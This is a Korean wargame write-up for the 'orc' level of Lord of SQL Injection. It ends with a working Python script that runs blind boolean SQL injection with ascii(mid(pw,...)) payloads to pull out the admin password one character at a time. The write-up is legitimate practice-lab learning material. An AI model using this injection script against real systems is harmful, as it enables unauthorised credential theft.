<img width="88" alt="스크린샷 2020-01-14 오후 2 49 06" src="https://user-images.githubusercontent.com/54495632/72317860-ec65fa80-36dd-11ea-889b-45323437421d.png">

4번 ORC

<img width="651" alt="스크린샷 2020-01-14 오후 2 49 12" src="https://user-images.githubusercontent.com/54495632/72317872-f12aae80-36dd-11ea-9287-ba881c08323d.png">

쿼리 자체는 이미 id에 admin이 입력되어 있는 형태이고
pw를 찾아서 입력하면 문제를 해결할 수 있다.

preg_match로 딱히 중요한게 필터링 되지는 않는다.

<img width="637" alt="스크린샷 2020-01-14 오후 2 51 05" src="https://user-images.githubusercontent.com/54495632/72317917-1cad9900-36de-11ea-9311-d8ac5f4e5a12.png">

다음과 같은 형식으로 pw의 길이를 찾았다.
pw의 where절 조건을 TRUE로 맞추면 id=admin에 의해
Hello admin이 출력된다.

<img width="294" alt="스크린샷 2020-01-14 오후 2 55 01" src="https://user-images.githubusercontent.com/54495632/72317974-4d8dce00-36de-11ea-8196-040673102328.png">

길이가 8이라는 조건을 이용하여 파이썬으로 해당 pw를 찾았다.

<img width="611" alt="스크린샷 2020-01-14 오후 2 55 16" src="https://user-images.githubusercontent.com/54495632/72317984-5a122680-36de-11ea-8e8e-48a62970f4e4.png">

알맞은 pw를 입력하여 문제를 해결하였다.

import requests

cookies={'PHPSESSID':'넣을 쿠키값'}
url="https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?"

pw=""
for i in range(1,9):
    for j in range(33,128):
        query="pw=%27or+ascii%28mid%28pw%2C"+str(i)+"%2C1%29%29%3D"+str(j)+"%23"
        geturl=url+query
        res=requests.get(geturl,cookies=cookies)
        if((res.text).find("Hello admin")>0):
            pw+=chr(j)
            print (pw)
            break

print ("finish pw :"+pw)
